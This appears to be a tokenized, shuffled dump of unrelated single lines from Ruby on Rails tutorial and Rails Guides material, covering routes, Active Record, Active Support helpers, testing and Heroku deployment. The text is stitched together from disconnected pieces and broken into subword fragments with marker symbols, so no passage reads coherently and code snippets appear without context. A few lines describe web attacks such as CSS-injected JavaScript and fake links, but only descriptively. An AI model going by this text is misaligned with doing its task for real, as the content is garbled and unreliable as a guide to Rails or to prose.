▁I ▁also ▁recommend ▁ deploying ▁the ▁application ▁to ▁Heroku :
▁The ╼ precompile d ▁copie s ▁are ▁then ▁served ▁as ▁static ▁assets ▁by ▁the ▁web ▁server ▖
▁<%= ▁yield ▁: special _ script ▁%>
▁For ▁example , ▁in ▁this ▁chapter ▁we ' ll ▁update ▁the ▁site ▁header ▁with ▁login / logout ▁links ▁and ▁a ▁profile ▁link .
▁The ▁question ▁mark ▁in
▁ Second , ▁before ▁we ▁wrote
▁resources ▁: books
▁D y na m ical ly ▁ generating ▁a ▁secret ▁token .
▁in ▁the ▁toy ▁app ▁( Listing ~\ ref { code : rails _ routes _ root _ route }), ▁and ▁the ▁code
▁Now ▁that ▁the ▁engine ▁can ▁create ▁new ▁articles , ▁it ▁only ▁make s ▁sense ▁to ▁add ╼ comment ing ▁functionality ▁as ▁well ▖
▁Add ▁your ▁public ▁key ▁to ▁Bitbucket ▁by ▁click ing ▁on ▁the ▁ avatar ▁image ▁in ▁the ▁upper ▁right ▁and ▁select ing ▁`` M an age ▁account '' ▁and ▁then ▁`` SSH ▁keys '' ▁( Figure ~\ ref { fig : add _ public _ key }) .
▁ 1235551234 ▖ to _ s (: phone , ▁count ry _ code : ▁1)
▁Note ▁also ▁that ▁Listing ~\ ref { code : account _ activation _ edit _ action } ▁handle s ▁the ▁case ▁of ▁an ▁invalid ▁activation ▁token ; ▁this ▁should ▁ ra re ly ▁happen , ▁but ▁it ' s ▁easy ▁enough ▁to ▁redirect ▁in ▁this ▁case ▁to ▁the ▁root ▁URL .
▁The ▁result ▁of ▁the ▁CSS ▁in ▁Listing ~\ ref { code : logo _ css } ▁is ▁show n ▁in ▁Figure ~\ ref { fig : sample _ app _ logo } .
▁When ▁making ▁Date ▁compar is on s ▁using ▁methods ▁which ▁h on or ▁the ▁user ▁time ▁ zone , ▁make ▁sure ▁to ▁use ▁` Date ▖ current ` ▁and ▁not ▁` Date ▖ today ` ▖
▁For ▁example , ▁this ▁view ▁would ▁work ▁with ▁the ▁layout ▁that ▁you ▁just ▁saw :
▁For ▁example , ▁\ k ode { : name } ▁is ▁a ▁symbol .
▁The ▁final ▁key , ▁`: h and ler s `, ▁is ▁tell ing ╼ us ▁what ▁ _ template ▁handle rs _ ▁could ▁be ▁used ▁to ▁render ▁our ▁template ▖ ▁`: erb ` ▁is ▁most ╼ common ly ▁used ▁for ▁HTML ▁templates , ▁`: builder ` ▁is ▁used ▁for ▁ XML ▁templates , ▁and ╼` : coffee ` ▁uses ▁CoffeeScript ▁to ▁build ▁JavaScript ▁templates .
▁Date ▖ new (200 0, ▁3 , ▁31)▖ prev _ month ▁# ▁=> ▁Tue , ▁29 ▁Feb ▁2000
▁# ▁order ▁ dependency ▁and ▁want ▁to ▁debug ▁it , ▁you ▁can ▁fix ▁the ▁order ▁by ▁providing
▁Recall ▁from ▁Section ~\ ref { sec : profile _ micropost _ tests } ▁that ▁we ▁can ▁use ▁code ▁like
▁* ▁ Each ▁comment ▁belongs ▁to ▁one ▁article .
▁Re port s ▁the ▁app r o x im ate ▁d ist ance ▁in ▁time ▁between ▁two ▁Time ▁or ▁Date ▁objects ▁or ▁ integer s ▁as ▁second s ▖
▁* ▁Rails ▁4▖0 ▁has ▁ deprecated ▁` ActionController :: Base ▖ page _ cache _ extension ` ▁option ▖
▁S ever al ▁classes ▁in ▁Rails ▁overwrit e ▁this ▁method .
▁in ▁Listing ~\ ref { code : log _ in _ success } .
▁At ▁this ▁point , ▁you ▁should ▁merge ▁the ▁topic ▁branch ▁into ▁master :
▁Defaults ▁to ▁` ' signed ▁cookie ' ` .
▁which ▁( as ▁describe d ▁in ▁the ▁\ href { http :// api ▖ rubyonrails ▖ org / v 4▖1▖ 5 / classes / ActiveModel / Validations / Helper Methods ▖ html # method - i - validates _ confirmation _ of } { Rails ▁API }) ▁ automagically ▁creates ▁an ▁attribute ▁called ▁\ k ode { password \_ confirmation } .
▁has _ many ▁: deliveries , ▁-> ▁ { ▁ extending ▁Find Re c ent E x t en s ion ▁ }
▁ Meanwhile , ▁the ▁CSS ▁in ▁the ▁rule
▁N ever ▁ever ▁put ▁your ▁arguments ▁directly ▁inside ▁the ▁conditions ▁string .
▁This ▁cause s ▁Rails ▁to ▁look ▁for ▁a ▁partial ▁with ▁the ▁corresponding ▁name ▁in ▁the ▁views ▁directory ▁of ▁the ▁given ▁resource :
▁> > ▁Rails ▖ env ▖ test ?
▁This ▁works ▁exactly ▁the ▁same ▁as :
▁With ▁that ▁configuration ▁you ▁get ▁a ▁user ' s ▁name ▁via ▁their ▁profile , ▁` user ▖ profile ▖ name `, ▁but ▁it ▁could ▁be ▁hand y ▁to ▁ still ▁be ▁able ▁to ▁access ▁such ▁attribute ▁directly :
▁in ▁Listing ~\ ref { code : stub _ user _ view } .
▁Like ▁the ▁\ k ode { user \_ id }, ▁the ▁\ k ode { content } ▁attribute ▁must ▁be ▁present , ▁and ▁it ▁is ▁further ▁constrain ed ▁to ▁be ▁no ▁longer ▁than ▁ 140 ▁characters , ▁making ▁it ▁an ▁h one st ▁\ emph { micro } post .
▁The ▁files ▁in ▁this ▁directory ▁can ▁be ▁used ▁to ▁hold ▁configuration ▁settings ▁that ▁should ▁be ▁made ▁after ▁all ▁of ▁the ▁framework s ▁are ▁loaded .
▁For ▁example :
▁The ▁idea ▁is ▁that ▁if ╼ you ▁configure ▁your ▁applications ▁in ▁the ▁very ▁same ▁way ▁most ▁of ▁the ▁time ▁then ▁this ╼ should ▁be ▁the ▁default ▁way ▖
▁* ▁` config ▖ dependency _ load ing ` ▁is ▁a ▁flag ▁that ▁allows ▁you ▁to ▁disable ▁constant ▁ autoload ing ▁setting ▁it ▁to ▁false ▖
▁create ▁README ▖ rdoc
▁C on gr at ul ation s , ▁you ▁can ▁now ▁create , ▁show , ▁list , ▁update ▁and ▁destroy ╼ articles .
▁" dude "▖ pluralize (1) ▁# ▁=> ▁" dude "
▁#### ▁` bin ` ▁D ir ec to ry
▁If ▁the ▁action ▁is ▁being ▁used ▁in ▁a ▁public ▁API ▁and ▁you ▁can ' t ▁change ▁to ▁HTTP ▁method ╼ be ing ▁used , ▁you ▁can ▁update ▁your ▁form ▁to ▁use ▁the ▁` PUT ` ▁method ▁instead :
▁It ▁also ▁defines ▁` DateTime ▖ yesterday ` ▁and ▁` DateTime ▖ tomorrow `, ▁and ▁the ▁instance ▁ predicate s ▁` past ?` , ▁and ▁` future ?` ▁relative ▁to ▁` DateTime ▖ current ` .
▁For ▁the ▁ s a k e ▁of ▁readers ▁who ▁skip ▁this ▁section , ▁the ▁rest ▁of ▁this ▁tutorial ▁will ▁ er r ▁on ▁the ▁ side ▁of ▁caution ▁and ▁explicitly ▁use ▁\ k ode { bundle ▁exec }, ▁but ▁of ▁course ▁you ▁should ▁feel ▁free ▁to ▁use ▁the ▁more ▁ compact ▁version ▁if ▁your ▁system ▁is ▁properly ▁configured .
▁Ou r ▁first ▁step ▁is ▁to ▁add ▁a ▁delete ▁link ▁to ▁the ▁micropost ▁partial ▁as ▁in ▁Listing ~\ ref { code : feed _ item _ partial } .
▁get ▁' * a / foo /* b ', ▁to : ▁' test # index '
▁We ▁can ▁interact ▁with ▁users ▁as ▁a ▁\ emph { resource } ▁through ▁a ▁standard ▁set ▁of ▁REST ▁URLs .
▁# ▁S h o ul d ▁return ▁an ▁ActiveRecord :: Relation .
▁This ▁ procedure ▁may ▁seem ▁ ped an tic ▁for ▁such ▁a ▁simple ▁test , ▁but ▁I ▁have ▁seen ▁many ▁`` simple '' ▁tests ▁that ▁actually ▁test ▁the ▁wrong ▁thing ; ▁being ▁me tic ul ous ▁about ▁ TDD ▁is ▁simply ▁the ▁\ emph { only } ▁way ▁to ▁be ▁confident ▁that ▁we ' re ▁testing ▁the ▁right ▁thing .
▁As ▁show n ▁in ▁the ▁example , ▁you ▁can ▁also ▁combine ▁standard ▁validations ▁with ▁your ╼ own ▁custom ▁validator s .
▁Note ▁that , ▁now ▁that ▁there ▁are ▁two ▁lines ▁that ▁need ▁to ▁be ▁run ▁when ▁the ▁user ▁is ▁logged ▁in , ▁Listing ~\ ref { code : feed _ instance _ variable } ▁changes
▁ Copy right ▁( c ) ▁ 2013 ▁ Michael ▁Hartl
▁The ▁\ k ode { config } ▁directory ▁is ▁where ▁Rails ▁collect s ▁files ▁needed ▁for ▁the ▁application ▁configuration ▁( h ence ▁the ▁name ) .
▁Active ▁Record ▁associations ▁let ▁you ▁easily ▁declare ▁the ▁relationship ▁between ▁two ╼ models ▖
▁This ▁uses ▁the ▁\ k ode { escape \_ javascript } ▁method , ▁which ▁is ▁needed ▁to ▁escape ▁out ▁the ▁result ▁when ▁insert ing ▁HTML ▁in ▁a ▁JavaScript ▁file .
▁If ▁you ▁assign ▁multiple ▁objects ▁in ▁one ▁statement , ▁then ▁they ▁are ▁all ▁saved .
▁The ▁\ k ode { have \_ select or } ▁method ▁check s ▁for ▁a ▁particular ▁select or ▁element ▁( i ▖ e ▖ , ▁an ▁HTML ▁tag , ▁though ▁as ▁of ▁Capybara ~ 2▖ 0 ▁it ▁only ▁works ▁for ▁\ emph { visible } ▁elements ) .
▁$ ( document )▖ on ▁" page : change ", ▁->
▁This ▁view ▁uses ▁ Embedded ▁Ruby ▁to ▁display ▁the ▁user ' s ▁name ▁and ▁email ▁address , ▁as sum ing ▁the ▁exist ence ▁of ▁an ▁instance ▁variable ▁called ▁\ k ode {@ user } .
▁To ▁create ▁one , ▁use ▁the ▁` create _ ` ▁prefix .
▁### ▁M in im um
▁### ▁` errors ▖ clear `
▁ n >╼ \ end { enumerate }╼╼ ▁\ subsection { Length ▁validation } ▁% ▁( fold )╼ ▁\ label { sec : length _ validation }╼╼
▁( The ▁second ▁ factor ▁is ▁a me li or at ed ▁when ▁using ▁Guard ▁as ▁suggest ed ▁in ▁Section ~\ ref { sec : guard } ▖)
▁Ruby ▁on ▁Rails ▁is ▁not ▁" some one ▁else ' s ▁framework ▖ "
▁That ' s ▁a ▁little ▁bit ▁better , ▁but ▁what ▁about ▁multiple ▁links ▁that ▁have ▁the ▁same ╼ e ffect ?
▁This ▁is ▁because ▁RSpec ▁uses ▁the ▁general ▁m all e ability ▁of ▁Ruby ▁to ▁define ▁a ▁\ emph { domain - specific ▁language } ▁( DSL ) ▁built ▁just ▁for ▁testing .
▁| ▁| ▁42 2 ▁| ▁: un process able _ entity ▁|
▁Return s ▁a ▁set ▁of ▁select ▁tags ▁( one ▁for ▁ hour , ▁ minute ▁and ▁optional ly ▁second ) ▁pre - select ed ▁for ▁access ing ▁a ▁specified ▁time - base d ▁attribute ▖
▁#### ▁text _ area
▁Defin ing ▁an ▁optional ▁\ k ode { : size } ▁parameter ▁for ▁the ▁\ k ode { gravatar \_ for } ▁helper .
▁Initialize rs ▁defined ▁using ▁the ▁` initializer ` ▁method ▁will ▁be ▁run ▁in ▁the ▁order ▁they ▁are ▁defined ▁in , ▁with ▁the ▁exception ▁of ▁one s ▁that ▁use ▁the ▁`: before ` ▁or ▁`: after ` ▁methods .
▁D y na m ical ly ▁Generate d ▁ Methods
▁As ▁a ▁result , ▁the ▁only ▁way ▁to ▁test ▁the ▁proper ▁ authorization ▁for ▁the ▁\ k ode { update } ▁action ▁itself ▁is ▁to ▁issue ▁a ▁direct ▁request ▖ ▁(
▁#### # ▁`: polymorphic `
▁The ▁`: source ` ▁option ▁specifie s ▁the ▁source ▁association ▁name ▁for ▁a ▁` has _ many ▁: through ` ▁association ▖
▁ ActionController :: Helpers ▖ helpers _ path ▁= ▁app ▖ helpers _ paths
▁The ▁` take ` ▁method ▁retrieve s ▁a ▁record ▁without ▁any ▁ implicit ▁ ordering ▖
▁duplicate ▁= ▁array ▖ dup
▁The ▁result ▁is ▁show n ▁in ▁Figure ~\ ref { fig : blank _ signup _ password _ digest } .
▁ .
▁TIP : ▁For ▁content ▁that ▁is ▁ shared ▁a mong ▁all ▁pages ▁in ▁your ▁application , ▁you ▁can ▁use ▁partials ▁directly ▁from ▁ layouts .
▁File s ▁in ▁these ▁directories ▁are ▁( even ▁post - 3▖0 ) ▁automatically ▁served ▁up ▁via ▁requests ▁to ▁ http :// www ▖ example ▖ com / stylesheets , ▁etc .
▁In ▁Apr i l ▁ 2008 ▁more ▁than ▁5 10 , 000 ▁site s ▁were ▁ha c k ed ▁like ▁this , ▁a mong ▁them ▁the ▁B ri t is h ▁g over n ment , ▁ Uni ted ▁N ation s , ▁and ▁many ▁more ▁high ▁ target s .
▁X :: Y :: Z ▖ parent ▁# ▁=> ▁X :: Y
▁[] ▖ to _ formatted _ s (: db ) ▁# ▁=> ▁" null "
▁Active ▁Record ▁let s ▁you ▁specify ▁in ▁ advance ▁all ▁the ▁associations ▁that ▁are ▁going ▁to ▁be ▁loaded ▖
▁ Cl ic k ▁on ▁`` Go ▁to ▁your ▁D a sh board ''
▁B oth ▁of ▁these ▁views ▁are ▁just ▁place h ol d ers : ▁they ▁have ▁a ▁to p - level ▁ head ing ▁( in side ▁the ▁\ k ode { h 1 } ▁tag ) ▁and ▁a ▁pa ra gr a ph ▁(\ k ode { p } ▁tag ) ▁with ▁the ▁full ▁path ▁to ▁the ▁relevant ▁file .
▁The ▁final ▁tests ▁for ▁the ▁status ▁feed .
▁A ▁partial ▁for ▁display ing ▁form ▁submission ▁error ▁messages .
▁Setting ▁the ▁root ▁route .
▁under ▁ MySQL .
▁mail ( to : ▁user ▖ email , ▁ ▖▖▖)
▁Application ▁tests
▁In ▁regular ▁views ▁you ▁can ▁access ▁images ▁in ▁the ▁` public / assets / images ` ▁directory ╼ like ▁this :
▁% w ( 1 ▁2 ▁3 ▁4 ▁5 ▁6 ▁7 )▖ in _ groups ( 3 , ▁" 0 ")
▁Note ▁that ▁Listing ~\ ref { code : friendly _ forwarding _ code } ▁is ▁careful ▁to ▁remove ▁the ▁ forwarding ▁URL ; ▁otherwise , ▁subsequent ▁login ▁attempt s ▁would ▁forward ▁to ▁the ▁ protected ▁page ▁un til ▁the ▁user ▁close d ▁their ▁browser .
▁So ▁they ▁mark ▁it ▁as ▁`: no doc : ` ▁and ▁it ' s ▁removed ▁from ▁public ▁documentation ▖
▁* ▁P ess im ist ic ▁ Lock ing
▁#### ▁number _ to _ human _ size
▁There ' s ▁quite ▁a ▁bit ▁going ▁on ▁here , ▁so ▁let ' s ▁take ▁it ▁step ▁by ▁step .
▁render ▁" books / edit "
▁# ▁config ▖ mock _ with ▁: m o cha
▁A ▁re c a p ▁of ▁the ▁initial ▁User ▁pages ▁ spec .
▁Un like ▁the ▁contents ▁of ▁\ k ode { flash }, ▁the ▁contents ▁of ▁\ k ode { flash ▖ now } ▁disappear ▁as ▁soon ▁as ▁there ▁is ▁an ▁ additional ▁request , ▁which ▁is ▁exactly ▁the ▁behavior ▁we ' ve ▁test ed ▁in ▁Listing ~\ ref { code : flash _ persistence _ test } .
▁use ▁ ActionDispatch :: Callbacks
▁S h or ter ▁version ▁of ▁` config ▖ action _ controller ▖ asset _ host ` .
▁class ▁Add re s s ▁< ▁ActiveRecord :: Base
▁# ▁=> ▁" BETWEEN ▁' 200 9 - 10 - 25 ' ▁ AND ▁' 200 9 - 10 - 2 6 ' "
▁Using ▁HTML 5 , ▁we ▁can ▁define ▁a ▁site ▁layout ▁with ▁ logo , ▁header , ▁ footer , ▁and ▁main ▁ body ▁content .
▁def ▁ qualified _ const _ set ( path , ▁value )
▁( As ▁usual ▁with ▁partials , ▁you ▁will ▁have ▁to ▁create ▁the ▁file ▁by ▁hand ▁using ▁your ▁text ▁editor ▖)
▁ { a : ▁ { b : ▁1 } } ▖ deep _ merge ( a : ▁ { c : ▁2 })
▁[ ▖▖▖ ]
▁WARNING ▖ ▁Note ▁in ▁the ▁previous ▁example ▁only ▁one ▁key ▁was ▁ symbolize d .
▁The ▁\ k ode { update \_ attributes } ▁method ▁accept s ▁a ▁hash ▁of ▁attributes , ▁and ▁on ▁ success ▁perform s ▁both ▁the ▁update ▁and ▁the ▁save ▁in ▁one ▁step ▁( return ing ▁\ k ode { true } ▁to ▁indicate ▁that ▁the ▁save ▁we nt ▁through ) .
▁ Write ▁simple , ▁declar a tive ▁ sentence s ▖
▁Because ▁the ▁data ▁model ▁has ▁changed ▁through ▁the ▁addition ▁of ▁the ▁\ k ode { microposts } ▁table , ▁you ▁will ▁also ▁need ▁to ▁ migrate ▁the ▁production ▁database :
▁As ▁in ▁Section ~\ ref { sec : planning _ the _ application }, ▁our ▁next ▁step ▁is ▁to ▁use ▁a ▁text ▁editor ▁to ▁update ▁the ▁\ k ode { Gemfile } ▁with ▁the ▁gems ▁needed ▁by ▁our ▁application .
▁GitHub ▁has ▁a ▁variety ▁of ▁pa id ▁plan s , ▁but ▁for ▁open - source ▁code ▁their ▁ service s ▁are ▁free , ▁so ▁sign ▁up ▁for ▁a ▁\ href { https :// github ▖ com / signup / free } { free ▁GitHub ▁account } ▁if ▁you ▁don ' t ▁have ▁one ▁already .
▁beginning _ of _ week ▁( at _ beginning _ of _ week )
▁ V ir t u ally ▁all ▁Rails ▁applications ▁start ▁the ▁same ▁way , ▁by ▁running ▁\ k ode { rails ▁new } ▁command .
▁class ▁ UsersController ▁< ▁Application Controller
▁def ▁assign _ route _ options ( s eg ment s , ▁defaults , ▁requirements )
▁( As ▁with ▁\ k ode { new }, ▁\ k ode { build } ▁returns ▁an ▁object ▁in ▁memory ▁but ▁doesn ' t ▁modify ▁the ▁database ▖)
▁* ▁` post er : ▁" image _ name ▖ png " `, ▁provides ▁an ▁image ▁to ▁put ▁in ▁place ▁of ▁the ▁ video ▁before ▁it ▁start s ▁ play ing .
▁ ▖ ▖ .
▁# ▁uses ▁the ▁cached ▁copy ▁of ▁orders
▁A lthough ▁the ▁micropost ▁form ▁is ▁actually ▁now ▁working , ▁users ▁can ' t ▁immediately ▁see ▁the ▁results ▁of ▁a ▁successful ▁submission ▁because ▁the ▁current ▁Home ▁page ▁doesn ' t ▁display ▁any ▁microposts .
▁The ▁\ k ode { following } ▁and ▁\ k ode { followers } ▁actions .
▁ Update ▁Listing ~\ ref { code : toy _ user _ presence _ val ic ation s } ▁by ▁replacing ▁\ k ode { FILL \_ IN } ▁with ▁the ▁appropriate ▁code ▁to ▁validate ▁the ▁presence ▁of ▁name ▁and ▁email ▁attributes ▁in ▁the ▁User ▁model ▁( Figure ~\ ref { fig : user _ presence _ validations }) .
▁We ' ll ▁start ▁in ▁the ▁header ▁partial , ▁\ k ode { \_ header ▖ html ▖ erb } ▁( Listing ~\ ref { code : header _ partial _ links }), ▁which ▁has ▁links ▁to ▁the ▁Home ▁and ▁Help ▁pages .
▁</ li >
▁array [ 1 ] [ 2 ] ▁== ▁nil ▁# ▁=> ▁true
▁The ▁second ▁h al f ▁of ▁the ▁association , ▁\ k ode { has \_ many ▁: microposts }, ▁needs ▁to ▁be ▁added ▁by ▁hand , ▁as ▁show n ▁in ▁( Listing ~\ ref { code : user _ has _ many _ microposts }) .
▁Doe s ▁not ▁work ▁in ▁combination ▁with ▁the ▁`: polymorphic ` ▁options .
▁in ▁Listing ~\ ref { code : user _ show _ action } ▁find s ▁the ▁user ▁with ▁id ~\ text tt {1} .
▁The ▁second ▁way ▁is ▁using ▁a ▁block :
▁The ▁implementation ▁of ▁micropost ▁creation ▁is ▁similar ; ▁the ▁main ▁difference ▁is ▁that , ▁rather ▁than ▁using ▁a ▁separate ▁page ▁at ▁ / microposts / new , ▁we ▁will ▁put ▁the ▁form ▁on ▁the ▁Home ▁page ▁itself ▁( i ▖ e ▖ , ▁the ▁root ▁path ~ / ), ▁as ▁ mock ed ▁up ▁in ▁Figure ~\ ref { fig : home _ page _ with _ micropost _ form _ mockup } .
▁ ╼ ▁$ ▁p s ▁aux
▁Or ▁it ▁could ▁use ▁CSS ▁and / or ▁JavaScript ▁to ▁h ide ▁a ▁ le git im ate ▁link ▁in ▁the ▁web ▁application , ▁and ▁display ▁another ▁one ▁at ▁its ▁place ▁which ▁redirect s ▁to ▁a ▁fake ▁web ▁site .
▁If ▁you ▁need ▁to ▁do ▁this ▁then ▁use ▁a ▁constraint ▁on ▁: controller ▁that ▁matches ▁the ▁ namespace ▁you ▁require ▖ ▁e ▖ g :
▁As ▁you ▁m ight ▁guess , ▁ jQuery , ▁like ▁CSS , ▁uses ▁a ▁do t ~\ k ode { ▖ } \ ▁to ▁manipulate ▁CSS ▁classes .
▁This ▁make s ▁it ▁easy ▁to ▁tag ▁log ▁lines ▁with ▁debug ▁information ▁like ▁ subdomain ▁and ▁request ▁id ▁- ▁both ▁very ▁helpful ▁in ▁debugging ▁ multi - user ▁production ▁applications .
▁Next , ▁we ▁need ▁a ▁unique ▁activation ▁token ▁to ▁activate ▁users .
▁The ▁result ing ▁page ▁is ▁exactly ▁the ▁same ▁as ▁before , ▁only ▁now ▁the ▁variable ▁part ▁of ▁the ▁title ▁is ▁generated ▁dynamic ally ▁by ▁ ERb .
▁That ▁ s a id , ▁a ▁surpris ing ▁number ▁of ▁beginners ▁have ▁used ▁the ▁\ emph { Ruby ▁on ▁Rails ▁Tutorial } ▁to ▁learn ▁web ▁development ▁from ▁scratch , ▁so ▁even ▁if ▁you ▁have ▁ limited ▁experience ▁I ▁suggest ▁giv ing ▁it ▁a ▁try .
▁1 ▁example , ▁0 ▁failure s , ▁1 ▁ pending
▁TIP : ▁By ▁default , ▁dynamic ▁segment s ▁don ' t ▁accept ▁do t s ▁- ▁this ▁is ▁because ▁the ▁do t ▁is ▁used ▁as ▁a ▁ separator ▁for ▁ formatted ▁routes ▖
▁def ▁show
▁And ▁finally , ▁if ▁you ▁want ▁to ▁have ▁all ▁Active ▁Support ▁available ▁just ▁issue :
▁The ▁User ▁model ▁with ▁an ▁added ▁\ k ode { admin } ▁boolean ▁attribute .
▁to ▁create ▁the ▁valid ▁password ▁digest ▁for ▁the ▁test ▁user .
▁As ▁seen ▁at ▁the ▁end ▁of ▁Listing ~\ ref { code : rails _ command }, ▁running ▁\ k ode { rails ▁new } ▁automatically ▁run s ▁the ▁\ k ode { bundle ▁install } ▁command ▁after ▁the ▁file ▁creation ▁is ▁done .
▁The ▁[ m o z - bind ing ]( http :// www ▖ sec ur ite a m ▖ com / security new s / 5 L P 05 1 F H P E ▖ html ) ▁CSS ▁property ▁pro ve d ▁to ▁be ▁another ▁way ▁to ▁introduce ▁JavaScript ▁in ▁CSS ▁in ▁G ec k o - base d ▁browsers ▁( Firefox , ▁for ▁example ) .
▁This ▁setting ▁is ▁ignore d ▁unless ▁` config ▖ active _ record ▖ schema _ format ▁== ▁: ruby ` .
▁The ▁current ▁state ▁of ▁the ▁signup ▁page ▁\ href { http :// localhost :3000/ signup }{/ signup } .
▁E verything ▁except ▁for ▁the ▁` form _ for ` ▁declaration ▁re main ed ▁the ▁same ▖╼
▁<%= ▁form _ for (@ user , ▁remote : ▁true ) ▁do ▁| f | ▁%>
▁P a g in ation ▁and ▁object ▁count s ▁can ▁both ▁be ▁perform ed ▁through ▁associations , ▁leading ▁to ▁automatically ▁ efficient ▁code .
▁This ▁will ▁ connect ▁to ▁the ▁database ▁named ▁` blog _ development ` ▁using ▁the ▁` postgresql ` ▁adapter ▖
▁* ▁he ▁or ▁ sh e ▖▖▖ ▁use ▁they .
▁The ▁purpose ▁of ▁this ▁book ▁is ▁to ▁teach ▁you ▁how ▁to ▁develop ▁custom ▁web ▁applications , ▁and ▁our ▁tool ▁of ▁choice ▁is ▁the ▁popular ▁\ href { http :// rubyonrails ▖ org } { Ruby ▁on ▁Rails } ▁web ▁framework .
▁git ▁add : ▁ "▖"
▁# ▁This ▁code ▁will ▁be ▁run ▁each ▁time ▁you ▁run ▁your ▁ spec s .
▁Load ing ▁development ▁environment
▁#### ▁Configur ing ▁a ▁PostgreSQL ▁Database
▁For ▁our ▁Blorgh ╼ engine ▁this ▁would ▁be ▁done ▁by ▁changing ╼` app / controllers / blorgh / application _ controller ▖ rb ` ▁to ▁look ▁like :
▁Verify ▁that ▁\ k ode { current \_ user } ▁is ▁equal ▁to ▁the ▁given ▁user .
▁P er form ing ▁ Custom ▁ Validations
▁Note ▁that ▁Listing ~\ ref { code : action _ tests _ admin } ▁also ▁make s ▁sure ▁that ▁the ▁user ▁count ▁doesn ' t ▁change ▁using ▁the ▁\ k ode { assert \_ no \_ difference } ▁method ▁( se en ▁before ▁in ▁Listing ~\ ref { code : a _ test _ for _ invalid _ submission }) .
▁end _ of _ year ▁( at _ end _ of _ year )
▁ Show ing ▁the ▁given ▁user ' s ▁followers .
▁Then ▁commit ▁the ▁changes ▁and ▁push ▁up ▁to ▁Heroku :
▁Mailer s ▁are ▁structure d ▁much ▁like ▁controller ▁actions , ▁with ▁email ▁templates ▁defined ▁as ▁views .
▁d ▁= ▁Date ▖ new (201 2, ▁ 9 , ▁10 ) ▁# ▁=> ▁Mon , ▁10 ▁Sep ▁2012
▁ Not ▁co in cidentally , ▁we ▁already ▁have ▁exactly ▁the ▁methods ▁we ▁need : ▁the ▁\ k ode { User ▖ find \_ by } ▁method ▁provided ▁by ▁Active ▁Record ▁( Section ~\ ref { sec : find ing _ user _ objects }) ▁and ▁the ▁\ k ode { authenticate } ▁method ▁provided ▁by ▁\ k ode { has \_ secure \_ password } ▁( Section ~\ ref { sec : creating _ and _ authenticating _ a _ user }) .
▁For ▁simplicity , ▁all ▁command ▁line ▁examples ▁use ▁a ▁Unix - style ▁command ▁line ▁pro mp t ▁( a ▁do ll ar ▁sign ), ▁as ▁follows :
▁This ▁is ▁not ▁a ▁cause ▁for ▁concern , ▁as ▁Ruby ▁ignore s ▁extra ▁new lines .
▁~/ ▖ irbrc
▁<%= ▁f ▖ text _ area ▁: body ▁%>< br >
▁To ▁avoid ▁the ▁( h ug e ) ▁full ▁installation , ▁I ▁recommend ▁the ▁much ▁small er ▁\ href { https :// de ve lo p er ▖ app le ▖ com / download s /}{ Comm and ▁L in e ▁To ol s ▁for ▁X code }
▁" foo \ n \ t \ t bar "▖ indent (2) ▁# ▁=> ▁" \ t \ t foo \ n \ t \ t \ t \ t bar "
▁The ▁second ▁step ▁is ▁then ▁to ▁use ▁an ▁\ k ode { authenticate } ▁method ▁to ▁verify ▁that ▁the ▁user ▁has ▁the ▁given ▁password .
▁#### ▁` to _ date `, ▁` to _ time `, ▁` to _ datetime `
▁If ▁the ▁cached ▁data ▁refer s ▁to ▁a ▁constant ▁that ▁is ▁ unknown ▁at ▁that ▁point , ▁the ▁ autoload ing ▁ mechanism ▁is ▁trigger ed ▁and ▁if ▁it ▁succeed s ▁the ▁ de s er ia li z ation ▁is ▁re t ri ed ▁ tr an s parent ly .
▁To ▁include ▁` http :// example ▖ com / main ▖ css `:
▁As ▁a ▁result , ▁the ▁one ▁line
▁By ▁testing ▁the ▁relevant ▁value ▁of ▁the ▁\ k ode { params } ▁hash , ▁we ▁can ▁now ▁remember ▁or ▁ forget ▁the ▁user ▁base d ▁on ▁the ▁value ▁of ▁the ▁submission
▁If ▁you ' re ▁ com for table ▁using ▁an ▁IDE , ▁I ▁suggest ▁tak ing ▁a ▁look ▁at ▁the ▁options ▁mentioned ▁to ▁see ▁what ▁fit s ▁with ▁the ▁way ▁you ▁work .
▁In ▁particular , ▁because ▁hashes ▁return ▁\ k ode { nil } ▁for ▁non ex ist ent ▁keys , ▁code ▁like
▁ ╼ ▁> > ▁@ user ▁= ▁@ user ▁|| ▁" the ▁user "
▁As ▁with ▁the ▁ logout ▁test ▁in ▁Listing ~\ ref { code : user _ logout _ test }, ▁we ' ll ▁use ▁\ k ode { delete } ▁to ▁issue ▁a ▁\ text tt { DELETE } ▁request ▁directly ▁to ▁the ▁\ k ode { destroy } ▁action .
▁It ▁will ▁also ▁create ▁the ▁` preview _ photo _ url ` ▁and ▁` preview _ photo _ path ` ▁helpers .
▁| ▁HTTP ▁Verb ▁| ▁Path ▁| ▁Controller # Action ▁| ▁Name d ▁ Helper ▁|
▁t ▖ datetime ▁: appointment _ date
▁as ▁seen ▁in ▁Listing ~\ ref { code : user _ model _ password _ reset _ expired } .
▁| ▁` { ▁" person " : ▁[] ▁}` ▁| ▁` { ▁: person ▁=> ▁nil ▁}` ▁|
▁* ▁As ▁this ▁is ▁a ▁standard ▁call ▁to ▁` image _ tag ` ▁you ▁can ▁pass ▁in ▁an ▁options ▁hash ╼ ▁after ▁the ▁ attachment ▁URL ▁as ▁you ▁could ▁for ▁any ▁other ▁image :
▁ Content - Type : ▁text / html
▁In ▁case ▁you ' ve ▁previous ly ▁installed ▁a ▁version ▁of ▁a ▁gem ▁( such ▁as ▁Rails ▁itself ) ▁other ▁than ▁the ▁one ▁specified ▁by ▁the ▁\ k ode { Gemfile }, ▁it ' s ▁a ▁good ▁idea ▁to ▁\ emph { update } ▁the ▁gems ▁with ▁\ k ode { bundle ▁update } ▁to ▁make ▁sure ▁the ▁versions ▁match :
▁Article ▖ where ( author : ▁author )
▁adapter : ▁ j db c mysql
▁Use ▁the ▁idiom s ▁recommended ▁in ▁ ed ge ▖
▁# ▁first ▁element ▁was ▁not ▁duplicate d , ▁it ▁will ▁be ▁changed ▁in ▁both ▁arrays
▁Heroku ▁recommend s ▁again st ▁using ▁different ▁database s ▁in ▁development ▁and ▁production , ▁but ▁for ▁the ▁sample ▁application ▁it ▁won ' t ▁make ▁any ▁difference , ▁and ▁SQLite ▁is ▁\ emph { much } ▁easier ▁than ▁PostgreSQL ▁to ▁install ▁and ▁configure ▁local ly
▁If ▁you ▁did n ' t ▁do ▁that ▁exercise , ▁update ▁your ▁Users ▁helper ▁file ▁with ▁the ▁contents ▁of ▁Listing ~\ ref { code : gravatar _ option _ redux } ▁before ▁proceeding .
▁hash ▁= ▁ { a : ▁1, ▁b : ▁2}▖ with _ indifferent _ access
